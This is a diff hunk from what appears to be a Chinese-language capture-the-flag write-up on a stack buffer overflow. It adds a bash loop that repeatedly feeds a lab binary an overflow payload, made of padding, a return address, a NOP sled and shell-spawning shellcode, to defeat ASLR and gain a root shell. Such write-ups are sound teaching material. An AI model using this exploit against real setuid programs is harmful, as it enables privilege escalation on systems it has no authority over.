@@ -218,3 +218,6 @@ run $(python2 -c 'print "A" * 171 + "\xd0\xcc\xff\xff" + "\x90" * 2000 + "\x31\x
 我也在目标机器上重复了相同的过程。但是，目标上的 ASLR 已启用，如果没有 root 权限，我们无法禁用它。因此，我们必须多次迭代相同的代码行。
 我替换了之前有效负载中的地址并运行了 for 循环
 经过两次不同的尝试，我得到了 root shell 和 flag
+```c
+for i in {1..10000}; do (./input $(python -c 'print "A" * 171 + "\xd0\xcc\xff\xff" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"')); done
+```
